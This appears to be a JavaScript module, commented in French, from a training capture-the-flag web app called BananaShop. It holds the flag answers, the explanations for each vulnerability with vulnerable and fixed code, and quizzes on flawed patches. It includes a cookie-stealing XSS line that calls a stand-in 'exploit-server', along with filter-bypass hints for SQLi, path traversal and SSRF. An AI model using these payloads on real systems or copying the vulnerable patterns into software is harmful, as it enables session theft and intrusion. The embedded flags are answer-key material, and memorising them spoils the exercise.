const FLAGS = {
  DATA_EXPOSURE: 'ASY{4h_c3_f4m3ux_3ndp01nt_0ubl13}',
  IDOR: 'ASY{pr0f1l_v0l3_s4ns_4ut0r1s4t10n}',
  REFLECTED_XSS: 'ASY{r3ch3rch3_p13g33_p4r_l3_scr1pt}',
  SQLI: 'ASY{4dm1n_s4ns_m0t_d3_p4ss3}',
  SQLI_UNION: 'ASY{un10n_s3l3ct_s3cr3ts_3xtr41ts}',
  BUSINESS_LOGIC: 'ASY{b4nqu13r_4ux_cr3d1ts_1nf1n1s}',
  JWT_FORGING: 'ASY{j3t0n_f0rg3_4cc3s_t0t4l}',
  STORED_XSS: 'ASY{4v1s_emp01s0nn3_p4g3_p13g33}',
  ZERO_RATING: 'ASY{z3r0_3t01l3s_v4l1d4t10n_byp4ss}',
  MASS_ASSIGNMENT: 'ASY{pr3m1um_s4ns_p4y3r}',
  PRIV_ESC_ROLE: 'ASY{m4ss_4ss1gn_r0l3_4dm1n}',
  CSRF: 'ASY{csrf_tr4nsf3rt_f0rc3}',
  PATH_TRAVERSAL: 'ASY{tr4v3rs4l_f1ch13r_s3cr3t}',
  SSRF: 'ASY{ssrf_r3qu3t3_1nt3rn3}',
  COOKIE_THEFT: 'ASY{c00k13_v0l3_xss_c0mpl3t}',
};

const { DIFFICULTY_POINTS, CHALLENGES } = require('../../shared/flags.json');

// Derive points from difficulty — single source of truth in shared/flags.json
const _diffPoints = (flagId) => {
  const ch = CHALLENGES.find(c => c.flagId === flagId);
  return ch ? (DIFFICULTY_POINTS[ch.difficulty] ?? 0) : 0;
};
const _diff = (flagId) => {
  const ch = CHALLENGES.find(c => c.flagId === flagId);
  return ch ? ch.difficulty : 'Unknown';
};

const FLAG_POINTS = Object.fromEntries(
  Object.entries(FLAGS).map(([id, flagValue]) => [
    flagValue,
    { points: _diffPoints(id), difficulty: _diff(id) },
  ])
);

const FLAG_EXPLANATIONS = {
  [FLAGS.DATA_EXPOSURE]: {
    danger: "Un endpoint de debug expose des secrets (clés JWT, identifiants admin). Un attaquant peut les utiliser pour compromettre toute l'application.",
    fix: "Supprimer les endpoints de debug en production. Ne jamais exposer de secrets dans les réponses API. Utiliser des variables d'environnement.",
    owasp: 'A05:2021 - Security Misconfiguration',
    vulnerableCode: `router.get('/config', (req, res) => {\n  res.json({ jwtSecret: 'secret', adminCredentials: {...} });\n});`,
    fixedCode: `// Supprimer l'endpoint en production\nif (process.env.NODE_ENV !== 'production') {\n  router.get('/config', requireAdmin, (req, res) => {\n    res.json({ appName: 'BananaShop', version: '1.0.0' });\n  });\n}`,
  },
  [FLAGS.IDOR]: {
    danger: "N'importe quel utilisateur authentifié peut accéder aux données de tous les autres utilisateurs en modifiant l'ID dans l'URL.",
    fix: "Vérifier côté serveur que l'utilisateur accède uniquement à ses propres ressources. Utiliser des UUIDs au lieu d'IDs séquentiels.",
    owasp: 'A01:2021 - Broken Access Control',
    vulnerableCode: `router.get('/:id', authenticate, (req, res) => {\n  const user = db.prepare('SELECT * FROM users WHERE id = ?').get(req.params.id);\n  res.json(user); // Pas de vérification !\n});`,
    fixedCode: `router.get('/:id', authenticate, (req, res) => {\n  if (parseInt(req.params.id) !== req.user.id) {\n    return res.status(403).json({ error: 'Access denied' });\n  }\n  // ... reste du code\n});`,
  },
  [FLAGS.REFLECTED_XSS]: {
    danger: "Du code JavaScript arbitraire s'exécute dans le navigateur de la victime. L'attaquant peut voler des cookies, rediriger, ou exfiltrer des données.",
    fix: "Ne jamais utiliser dangerouslySetInnerHTML avec des données utilisateur. Échapper toutes les sorties HTML. Utiliser une CSP stricte.",
    owasp: 'A03:2021 - Injection (XSS)',
    vulnerableCode: `// Serveur : renvoie le terme tel quel\nres.json({ products, searchTerm: search });\n// Client : l'affiche en HTML brut\n<span dangerouslySetInnerHTML={{ __html: displaySearch }} />`,
    fixedCode: `// Serveur : échapper le HTML\nconst escapeHtml = (s) => s.replace(/&/g,'&amp;').replace(/</g,'&lt;');\nres.json({ products, searchTerm: escapeHtml(search) });\n// Client : utiliser du texte\n<span>{displaySearch}</span>`,
  },
  [FLAGS.SQLI]: {
    danger: "Un attaquant peut se connecter en tant qu'admin sans connaître le mot de passe, accéder à toutes les données, ou modifier la base.",
    fix: "Utiliser des requêtes préparées (paramétrisées). Ne jamais concaténer les entrées utilisateur dans du SQL.",
    owasp: 'A03:2021 - Injection',
    vulnerableCode: `const user = db.prepare(\n  \`SELECT * FROM users WHERE username = '\${username}'\`\n).get();`,
    fixedCode: `const user = db.prepare(\n  'SELECT * FROM users WHERE username = ?'\n).get(username);`,
  },
  [FLAGS.SQLI_UNION]: {
    danger: "L'attaquant peut extraire des données de n'importe quelle table de la base via UNION SELECT, y compris des secrets, mots de passe, etc.",
    fix: "Requêtes préparées obligatoires. Limiter les privilèges de l'utilisateur base de données.",
    owasp: 'A03:2021 - Injection',
    vulnerableCode: `products = db.prepare(\n  \`SELECT ... FROM products WHERE name LIKE '%\${search}%'\`\n).all();`,
    fixedCode: `products = db.prepare(\n  'SELECT ... FROM products WHERE name LIKE ?'\n).all(\`%\${search}%\`);`,
  },
  [FLAGS.BUSINESS_LOGIC]: {
    danger: "Un attaquant peut se créditer un montant infini en envoyant des valeurs négatives. La logique métier est contournée.",
    fix: "Valider que le montant est strictement positif côté serveur. Ne jamais faire confiance aux données du client.",
    owasp: 'A04:2021 - Insecure Design',
    vulnerableCode: `const sendAmount = parseFloat(amount);\nif (isNaN(sendAmount)) { // Pas de check > 0 !\n  return res.status(400).json({ error: 'Invalid' });\n}`,
    fixedCode: `const sendAmount = parseFloat(amount);\nif (isNaN(sendAmount) || sendAmount <= 0) {\n  return res.status(400).json({ error: 'Amount must be positive' });\n}`,
  },
  [FLAGS.JWT_FORGING]: {
    danger: "Avec un secret faible ou l'algorithme 'none', un attaquant peut forger des tokens admin et accéder à toutes les fonctionnalités.",
    fix: "Utiliser un secret fort (256+ bits aléatoires). N'accepter que HS256. Stocker le secret dans les variables d'environnement.",
    owasp: 'A02:2021 - Cryptographic Failures',
    vulnerableCode: `const JWT_SECRET = 'secret';\njwt.verify(token, JWT_SECRET, {\n  algorithms: ['HS256', 'none'] // none = pas de signature !\n});`,
    fixedCode: `const JWT_SECRET = process.env.JWT_SECRET; // Secret fort\njwt.verify(token, JWT_SECRET, {\n  algorithms: ['HS256'] // Uniquement HS256\n});`,
  },
  [FLAGS.STORED_XSS]: {
    danger: "Le script malveillant est stocké en base et s'exécute chez TOUS les visiteurs. Vol de session massif, defacement, phishing.",
    fix: "Sanitiser les entrées (DOMPurify côté client, sanitize-html côté serveur). Ne jamais utiliser dangerouslySetInnerHTML.",
    owasp: 'A03:2021 - Injection (XSS)',
    vulnerableCode: `// Stockage sans sanitisation\ndb.prepare('INSERT INTO reviews ... VALUES (?, ?, ?, ?)').run(..., content, ...);\n// Affichage en HTML brut\n<div dangerouslySetInnerHTML={{ __html: review.content }} />`,
    fixedCode: `// Sanitiser avant stockage\nconst sanitizeHtml = require('sanitize-html');\nconst safe = sanitizeHtml(content, { allowedTags: [], allowedAttributes: {} });\n// Afficher en texte\n<div>{review.content}</div>`,
  },
  [FLAGS.ZERO_RATING]: {
    danger: "Le client peut contourner toute validation frontend en envoyant des requêtes directement à l'API. Les contraintes UI ne sont pas de la sécurité.",
    fix: "Toujours valider côté serveur. Le frontend est une commodité UX, pas une mesure de sécurité.",
    owasp: 'A04:2021 - Insecure Design',
    vulnerableCode: `const ratingValue = parseInt(rating);\nconst safeRating = isNaN(ratingValue) ? 5 : ratingValue;\n// Accepte 0, -1, 999...`,
    fixedCode: `const ratingValue = parseInt(rating);\nif (isNaN(ratingValue) || ratingValue < 1 || ratingValue > 5) {\n  return res.status(400).json({ error: 'Rating must be 1-5' });\n}`,
  },
  [FLAGS.MASS_ASSIGNMENT]: {
    danger: "Le tunnel d'achat facture le prix envoyé par le client. Un utilisateur peut donc obtenir Premium sans payer en fournissant un prix à 0 dans la requête.",
    fix: "Ne jamais faire confiance à un prix/montant venant du client. Le serveur doit imposer le prix à partir du plan choisi et ignorer tout champ prix du body.",
    owasp: 'A04:2021 - Insecure Design',
    vulnerableCode: `const { plan, price: clientPrice } = req.body;\nconst price = clientPrice !== undefined ? parseFloat(clientPrice) : PLAN_PRICES[plan];\n// price=0 dans le body => Premium sans débiter !`,
    fixedCode: `const { plan } = req.body;\nconst price = PLAN_PRICES[plan];\n// Le prix est imposé par le serveur, jamais lu depuis le body`,
  },
  [FLAGS.PRIV_ESC_ROLE]: {
    danger: "Un champ en trop dans l'update de profil permet de se donner le rôle admin : l'utilisateur choisit lui-même son niveau de privilège, et accède ensuite au panneau d'administration.",
    fix: "Le rôle ne se modifie jamais depuis une requête de profil. Le retirer de la whitelist, et réserver son changement à un endpoint d'administration authentifié.",
    owasp: 'A01:2021 - Broken Access Control',
    vulnerableCode: `const { email, bio, username, role } = req.body;\ndb.prepare('UPDATE users SET role = COALESCE(?, role) ... ').run(role, ...);`,
    fixedCode: `const { email, bio, username } = req.body;\n// 'role' n'est jamais lu depuis le body du profil\n// PUT /api/admin/users/:id, protégé par requireAdmin, s'en charge`,
  },
  [FLAGS.CSRF]: {
    danger: "Un site malveillant peut forcer le navigateur de la victime à effectuer des actions (transfert de crédits) sans son consentement.",
    fix: "Utiliser des tokens CSRF (synchronizer token pattern). Configurer SameSite=Strict sur les cookies. Vérifier l'en-tête Origin.",
    owasp: 'A01:2021 - Broken Access Control',
    vulnerableCode: `// Pas de token CSRF\n// Cookie: sameSite: 'lax' (pas 'strict')\n// Pas de vérification de l'Origin\nrouter.post('/send', authenticate, (req, res) => { ... });`,
    fixedCode: `// Vérifier l'Origin\nif (req.headers.origin !== EXPECTED_ORIGIN) {\n  return res.status(403).json({ error: 'CSRF detected' });\n}\n// Cookie: sameSite: 'strict'\n// + Token CSRF dans un header custom`,
  },
  [FLAGS.PATH_TRAVERSAL]: {
    danger: "Un attaquant peut lire n'importe quel fichier du serveur (code source, configuration, /etc/passwd) en manipulant le chemin du fichier.",
    fix: "Ne jamais construire des chemins de fichiers à partir d'entrées utilisateur. Utiliser path.basename() pour extraire le nom de fichier. Valider contre une whitelist.",
    owasp: 'A01:2021 - Broken Access Control',
    vulnerableCode: `const filePath = path.join('public/bananas', req.query.file);\nconst content = fs.readFileSync(filePath);\n// file=../../secret_flag.txt => lit le fichier secret !`,
    fixedCode: `const filename = path.basename(req.query.file); // Supprime ../\nconst filePath = path.join('public/bananas', filename);\n// Ou mieux : vérifier contre une whitelist`,
  },
  [FLAGS.SSRF]: {
    danger: "L'attaquant peut forcer le serveur à effectuer des requêtes vers des services internes (bases de données, APIs privées, cloud metadata).",
    fix: "Valider et filtrer les URLs. Bloquer les adresses internes (localhost, 127.0.0.1, 10.x, 192.168.x). Utiliser une whitelist de domaines.",
    owasp: 'A10:2021 - Server-Side Request Forgery',
    vulnerableCode: `// L'utilisateur fournit l'URL\nconst response = await fetch(req.body.url);\nconst data = await response.text();\nres.json({ content: data });\n// url=http://localhost:3000/api/internal/flag`,
    fixedCode: `const url = new URL(req.body.url);\nconst blocked = ['localhost','127.0.0.1','0.0.0.0','[::1]'];\nif (blocked.includes(url.hostname)) {\n  return res.status(400).json({ error: 'URL non autorisée' });\n}`,
  },
  [FLAGS.COOKIE_THEFT]: {
    danger: "Via XSS, l'attaquant vole le cookie de session et peut usurper l'identité de la victime. C'est l'attaque XSS la plus impactante.",
    fix: "Configurer httpOnly: true sur les cookies (inaccessible au JavaScript). Utiliser une CSP stricte. Sanitiser les entrées.",
    owasp: 'A03:2021 - Injection (XSS) + A07:2021 - Auth Failures',
    vulnerableCode: `// Cookie accessible au JavaScript\nres.cookie('token', token, { httpOnly: false });\n// XSS payload : fetch('http://exploit-server/steal?c='+document.cookie)`,
    fixedCode: `// Cookie inaccessible au JavaScript\nres.cookie('token', token, {\n  httpOnly: true,  // Pas accessible via document.cookie\n  secure: true,    // HTTPS uniquement\n  sameSite: 'strict'\n});`,
  },
};

// ─── Fix-It Lab (page /blue) ───
// Pour chaque faille, trois correctifs plausibles : un seul tient debout. Les
// deux autres sont les réflexes qu'on croise le plus souvent en revue de code —
// filtrer par blacklist, contrôler côté client, obscurcir — et `why` dit
// exactement ce qu'ils laissent passer. C'est là qu'est la leçon : un
// développeur qui a déjà écrit le mauvais correctif s'en souvient.
//
// Les réponses partent au client avec l'explication : le Fix-It de la page
// Challenges donne déjà le code corrigé, il n'y a rien à cacher de plus.
const FLAG_QUIZZES = {
  IDOR: {
    choices: [
      {
        ok: true,
        code: `router.get('/:id', authenticate, (req, res) => {\n  if (Number(req.params.id) !== req.user.id) {\n    return res.status(403).json({ error: 'Access denied' });\n  }\n  // ...\n});`,
        why: "Le serveur compare la ressource demandée à l'identité portée par le token. C'est le seul endroit où la décision ne peut pas être contournée.",
      },
      {
        code: `const id = Buffer.from(req.params.id, 'base64').toString();\nconst user = db.prepare('SELECT * FROM users WHERE id = ?').get(id);`,
        why: "Encoder l'identifiant ne le protège pas : on décode, on incrémente, on ré-encode. C'est de l'obscurité, pas du contrôle d'accès.",
      },
      {
        code: `// Côté React : ne montrer le lien que pour soi\n{user.id === me.id && <Link to={'/profile/' + user.id} />}`,
        why: "Cacher le lien ne ferme pas la route. L'API répond toujours à qui l'appelle directement — c'est précisément ce que vous venez de faire avec Burp.",
      },
    ],
  },

  DATA_EXPOSURE: {
    choices: [
      {
        ok: true,
        code: `// L'endpoint de debug ne part pas en production\nif (process.env.NODE_ENV !== 'production') {\n  router.get('/config', requireAdmin, (req, res) => {\n    res.json({ appName: 'BananaShop', version: '1.0.0' });\n  });\n}`,
        why: "La route disparaît en production, et même en développement elle ne renvoie plus de secret. Un secret qui ne quitte jamais le serveur ne fuit pas.",
      },
      {
        code: `router.get('/_cfg9x2f', (req, res) => {\n  res.json({ jwtSecret: 'secret', adminCredentials: {...} });\n});`,
        why: "Renommer la route ne fait que la rendre moins devinable. Une wordlist, un fichier JS oublié ou une archive du site suffisent à la retrouver — vous l'avez déjà fait aujourd'hui.",
      },
      {
        code: `res.json({\n  jwtSecret: jwtSecret.slice(0, 4) + '***',\n  adminCredentials: { username: 'admin', password: '***' },\n});`,
        why: "Masquer partiellement, c'est encore divulguer : les quatre premiers caractères réduisent l'espace de recherche, et le nom du compte admin reste offert.",
      },
    ],
  },

  PATH_TRAVERSAL: {
    choices: [
      {
        ok: true,
        code: `const filename = path.basename(req.query.file);\nconst filePath = path.join('public/bananas', filename);`,
        why: "`path.basename()` ne garde que le nom de fichier : il n'existe plus de chemin à remonter. Mieux encore, une whitelist des fichiers servis.",
      },
      {
        code: `const safe = req.query.file.replace(/\\.\\.\\//g, '');\nconst filePath = path.join('public/bananas', safe);`,
        why: "Un remplacement en un seul passage se contourne : `....//` perd son `../` central et redevient `../`. Nettoyer plutôt que refuser laisse toujours une écriture qui passe.",
      },
      {
        code: `if (req.query.file.startsWith('/')) {\n  return res.status(400).json({ error: 'Chemin absolu interdit' });\n}`,
        why: "Bloquer les chemins absolus ne dit rien des chemins relatifs. `../../secret_flag.txt` ne commence pas par `/` et sort pourtant du dossier.",
      },
    ],
  },

  ZERO_RATING: {
    choices: [
      {
        ok: true,
        code: `const rating = parseInt(req.body.rating, 10);\nif (isNaN(rating) || rating < 1 || rating > 5) {\n  return res.status(400).json({ error: 'Rating must be 1-5' });\n}`,
        why: "La plage autorisée est vérifiée là où la donnée arrive vraiment. Tout ce qui sort de 1–5 est refusé, quelle que soit la façon dont la requête a été fabriquée.",
      },
      {
        code: `// Côté React : un select au lieu d'un champ libre\n<select name="rating">\n  {[1, 2, 3, 4, 5].map((n) => <option key={n}>{n}</option>)}\n</select>`,
        why: "Le formulaire n'est qu'une suggestion. L'API accepte n'importe quel corps de requête, et Burp ne passe pas par votre `<select>`.",
      },
      {
        code: `const rating = parseInt(req.body.rating, 10);\nconst safeRating = isNaN(rating) ? 5 : rating;`,
        why: "Une valeur par défaut couvre le cas « pas un nombre », pas le cas « mauvais nombre ». `0`, `-1` et `999` sont des entiers parfaitement valides.",
      },
    ],
  },

  REFLECTED_XSS: {
    choices: [
      {
        ok: true,
        code: `// Serveur : échapper avant de renvoyer\nconst escapeHtml = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;');\nres.json({ products, searchTerm: escapeHtml(search) });\n// Client : rendre du texte, pas du HTML\n<span>{displaySearch}</span>`,
        why: "La donnée est traitée comme du texte de bout en bout. Sans interprétation HTML, il n'y a plus d'injection possible — quel que soit le payload.",
      },
      {
        code: `const clean = search.replace(/<script>/gi, '');\nres.json({ products, searchTerm: clean });`,
        why: "Une blacklist ne liste jamais tout. `<img src=x onerror=...>`, `<svg onload=...>` ou `<body onpageshow=...>` n'ont pas besoin de la balise `<script>`.",
      },
      {
        code: `// Côté React, avant d'appeler l'API\nif (/[<>]/.test(search)) return;\nfetch('/api/products?search=' + search);`,
        why: "Le contrôle vit dans le navigateur de l'attaquant : il lui suffit de ne pas l'exécuter. Toute validation faite uniquement côté client est une validation absente.",
      },
    ],
  },

  MASS_ASSIGNMENT: {
    choices: [
      {
        ok: true,
        code: `const { plan } = req.body;\nconst price = PLAN_PRICES[plan];\n// Le prix est imposé par le serveur, jamais lu depuis le body.`,
        why: "Le montant à débiter est une donnée serveur : il découle du plan choisi. Le client n'a aucune raison de le fournir, donc on ne le lit pas.",
      },
      {
        code: `const price = Math.max(0, parseFloat(req.body.price));\n// on borne juste le prix envoyé par le client`,
        why: "Borner un prix client ne le rend pas fiable : un premium à 1 crédit reste un premium bradé. Le prix ne doit pas venir du client du tout.",
      },
      {
        code: `// Masquer le champ prix dans le formulaire d'achat\n<input type="hidden" name="price" value={PLAN_PRICES[plan]} />`,
        why: "Le corps de la requête est écrit par le client. Ce que le formulaire envoie ou non n'a aucune influence sur ce que le serveur accepte.",
      },
    ],
  },

  PRIV_ESC_ROLE: {
    choices: [
      {
        ok: true,
        code: `const { email, bio, username } = req.body;\n// Le rôle ne se change que via PUT /api/admin/users/:id,\n// protégé par requireAdmin.`,
        why: "Le privilège ne transite plus par une requête que l'utilisateur contrôle. Changer un rôle devient une action d'administration, tracée et authentifiée.",
      },
      {
        code: `const { email, bio, username, role } = req.body;\nif (role === 'admin') {\n  return res.status(403).json({ error: 'Interdit' });\n}`,
        why: "Vous bloquez une valeur, pas le mécanisme. `Admin`, `superadmin`, `moderator` ou tout rôle privilégié ajouté plus tard passeront sans encombre.",
      },
      {
        code: `// Masquer le champ rôle dans le formulaire de profil\n{me.role === 'admin' && <RoleSelect />}`,
        why: "L'interface n'est pas une frontière de sécurité. La requête part du client : ce qu'il affiche ne change rien à ce qu'il peut envoyer.",
      },
    ],
  },

  JWT_FORGING: {
    choices: [
      {
        ok: true,
        code: `const JWT_SECRET = process.env.JWT_SECRET; // 256+ bits aléatoires\njwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] });`,
        why: "Un secret fort hors du code, et un seul algorithme accepté. Sans `none` et sans secret devinable, le token ne se forge plus.",
      },
      {
        code: `const payload = jwt.decode(token);\nif (payload.role === 'admin') {\n  // accès admin\n}`,
        why: "`decode()` lit le token sans jamais vérifier la signature. N'importe qui peut écrire `role: admin` dans le payload. C'est l'erreur la plus répandue sur les JWT.",
      },
      {
        code: `const JWT_SECRET = 'BananaShop_Secret_2024_Production!';\njwt.verify(token, JWT_SECRET, { algorithms: ['HS256', 'none'] });`,
        why: "Un secret plus long reste un secret en dur : il est dans le dépôt, dans l'historique Git, dans l'image Docker. Et `none` est toujours accepté — la signature devient facultative.",
      },
    ],
  },

  SQLI: {
    choices: [
      {
        ok: true,
        code: `const user = db.prepare(\n  'SELECT * FROM users WHERE username = ?'\n).get(username);`,
        why: "La requête préparée sépare le code SQL de la donnée. Le contenu de `username` ne peut plus devenir de la syntaxe, quoi qu'il contienne.",
      },
      {
        code: `const safe = username.replace(/'/g, "''");\nconst user = db.prepare(\n  \`SELECT * FROM users WHERE username = '\${safe}'\`\n).get();`,
        why: "Échapper à la main, c'est réimplémenter le moteur SQL. Les cas particuliers (backslash, encodage, contextes numériques sans quotes) finissent toujours par vous échapper.",
      },
      {
        code: `const banned = ['OR', 'UNION', '--', ';'];\nif (banned.some((w) => username.toUpperCase().includes(w))) {\n  return res.status(400).json({ error: 'Requête invalide' });\n}`,
        why: "Une blacklist bloque les utilisateurs légitimes (« O'Connor », « Dupont-OR ») avant de bloquer l'attaquant, qui contourne avec `||`, `/**/` ou des commentaires imbriqués.",
      },
    ],
  },

  BUSINESS_LOGIC: {
    choices: [
      {
        ok: true,
        code: `const amount = parseFloat(req.body.amount);\nif (isNaN(amount) || amount <= 0) {\n  return res.status(400).json({ error: 'Amount must be positive' });\n}`,
        why: "La règle métier — un transfert est positif — est vérifiée côté serveur, au moment où elle compte. La requête invalide est refusée, pas réparée.",
      },
      {
        code: `const amount = Math.abs(parseFloat(req.body.amount));`,
        why: "`Math.abs()` transforme silencieusement un `-50` en `+50`. Le débit passe, dans le mauvais sens peut-être, et l'utilisateur n'est jamais prévenu que sa requête était absurde.",
      },
      {
        code: `<input type="number" name="amount" min="0" step="0.01" />`,
        why: "`min` est une aide à la saisie, pas un contrôle. Elle disparaît dès qu'on envoie la requête autrement que par le formulaire.",
      },
    ],
  },

  SQLI_UNION: {
    choices: [
      {
        ok: true,
        code: `products = db.prepare(\n  'SELECT id, name, price FROM products WHERE name LIKE ?'\n).all(\`%\${search}%\`);`,
        why: "Le terme de recherche devient un paramètre, jamais du SQL. `UNION SELECT` s'y retrouve cherché comme un nom de produit — et ne trouve rien.",
      },
      {
        code: `if (search.toUpperCase().includes('UNION')) {\n  return res.status(400).json({ error: 'Requête invalide' });\n}`,
        why: "Le filtre se contourne par la casse mélangée, les commentaires (`UN/**/ION`) ou l'encodage. Et il ne ferme pas l'injection : seulement une de ses formes.",
      },
      {
        code: `products = db.prepare(\n  \`SELECT ... FROM products WHERE name LIKE '%\${search}%' LIMIT 20\`\n).all();`,
        why: "`LIMIT` réduit le nombre de lignes exfiltrées, pas la capacité à injecter. Vingt lignes bien choisies suffisent largement à sortir un secret.",
      },
    ],
  },

  STORED_XSS: {
    choices: [
      {
        ok: true,
        code: `const sanitizeHtml = require('sanitize-html');\nconst safe = sanitizeHtml(content, { allowedTags: [], allowedAttributes: {} });\n// et à l'affichage : <div>{review.content}</div>`,
        why: "Une bibliothèque éprouvée nettoie à l'entrée, et l'affichage se fait en texte. Deux barrières, dont aucune ne repose sur une liste de balises interdites.",
      },
      {
        code: `const safe = content.replace(/<script[\\s\\S]*?<\\/script>/gi, '');\ndb.prepare('INSERT INTO reviews ...').run(safe);`,
        why: "Vous retirez la balise la moins utile à l'attaquant. `<img onerror>`, `<svg onload>` et les attributs `on*` passent tous, et sont désormais stockés en base pour chaque visiteur.",
      },
      {
        code: `// Ajouter une CSP\nres.setHeader('Content-Security-Policy', "script-src 'self'");`,
        why: "Une CSP est une excellente défense en profondeur, mais elle ne corrige pas l'injection : le HTML malveillant est toujours stocké et rendu. Elle limite les dégâts, elle ne ferme pas la faille.",
      },
    ],
  },

  SSRF: {
    choices: [
      {
        ok: true,
        code: `const url = new URL(req.body.url);\nconst ALLOWED = ['images.example.com'];\nif (!ALLOWED.includes(url.hostname) || url.protocol !== 'https:') {\n  return res.status(400).json({ error: 'URL non autorisée' });\n}`,
        why: "Une whitelist de destinations : tout ce qui n'est pas explicitement permis est refusé. C'est la seule approche qui résiste aux adresses internes que vous n'aviez pas prévues.",
      },
      {
        code: `if (req.body.url.includes('localhost')) {\n  return res.status(400).json({ error: 'URL non autorisée' });\n}`,
        why: "`127.0.0.1`, `[::1]`, `0.0.0.0`, `127.1`, `2130706433`, ou un domaine public qui pointe vers 127.0.0.1 : la même machine a une infinité de noms.",
      },
      {
        code: `const response = await fetch(req.body.url, { signal: AbortSignal.timeout(2000) });`,
        why: "Un timeout limite le scan de ports à l'aveugle, pas la lecture d'un service interne : une API locale répond en quelques millisecondes.",
      },
    ],
  },

  COOKIE_THEFT: {
    choices: [
      {
        ok: true,
        code: `res.cookie('token', token, {\n  httpOnly: true,  // invisible pour document.cookie\n  secure: true,    // HTTPS uniquement\n  sameSite: 'strict',\n});`,
        why: "`httpOnly` retire le cookie de la portée du JavaScript. Même avec une XSS, `document.cookie` ne renvoie plus rien à exfiltrer.",
      },
      {
        code: `const encrypted = encrypt(token, KEY);\nres.cookie('token', encrypted, { httpOnly: false });`,
        why: "Un cookie volé se rejoue tel quel : l'attaquant n'a pas besoin de le comprendre, seulement de le renvoyer. Le chiffrer ne change rien au vol.",
      },
      {
        code: `// Ne plus utiliser de cookie\nlocalStorage.setItem('token', token);`,
        why: "C'est pire : `localStorage` est lisible en JavaScript par construction, et aucun `httpOnly` ne viendra jamais le protéger d'une XSS.",
      },
    ],
  },

  CSRF: {
    choices: [
      {
        ok: true,
        code: `// Cookie en sameSite: 'strict'\n// + jeton anti-CSRF vérifié à chaque écriture\nif (req.headers['x-csrf-token'] !== req.session.csrfToken) {\n  return res.status(403).json({ error: 'CSRF detected' });\n}`,
        why: "Le jeton vit dans une réponse que seul le vrai site peut lire, et `sameSite: 'strict'` empêche le cookie de partir avec une requête inter-site. L'un couvre l'autre.",
      },
      {
        code: `if (!req.headers.referer?.startsWith('https://bananashop')) {\n  return res.status(403).json({ error: 'CSRF detected' });\n}`,
        why: "Le `Referer` est absent ou tronqué dans bien des configurations légitimes — et le test par préfixe accepte `https://bananashop.attaquant.com`.",
      },
      {
        code: `// Passer l'action en POST au lieu de GET\nrouter.post('/send', authenticate, (req, res) => { ... });`,
        why: "Un formulaire auto-soumis fait un POST inter-site sans difficulté. La méthode HTTP n'a jamais été une preuve d'intention.",
      },
    ],
  },
};

// Le quiz rejoint l'explication : l'endpoint /api/explanation/:flagId la
// renvoie déjà telle quelle, et reste fermé tant que le flag n'est pas capturé.
for (const [flagId, quiz] of Object.entries(FLAG_QUIZZES)) {
  const explanation = FLAG_EXPLANATIONS[FLAGS[flagId]];
  if (explanation) explanation.quiz = quiz;
}

const ALL_FLAGS = Object.values(FLAGS);

// Flags des challenges activés dans shared/flags.json. Un flag dont le
// challenge est `enabled: false` ne doit pas rapporter de points : il
// n'apparaît pas dans la liste des challenges des participants.
const ENABLED_FLAG_IDS = new Set(CHALLENGES.filter(c => c.enabled).map(c => c.flagId));
const ENABLED_FLAGS = Object.entries(FLAGS)
  .filter(([id]) => ENABLED_FLAG_IDS.has(id))
  .map(([, value]) => value);

// Reverse mapping: flag value -> flag key (e.g. 'ASY{...}' -> 'IDOR')
const FLAG_IDS = Object.fromEntries(
  Object.entries(FLAGS).map(([key, value]) => [value, key])
);

module.exports = { FLAGS, FLAG_POINTS, FLAG_EXPLANATIONS, FLAG_IDS, ALL_FLAGS, ENABLED_FLAGS };
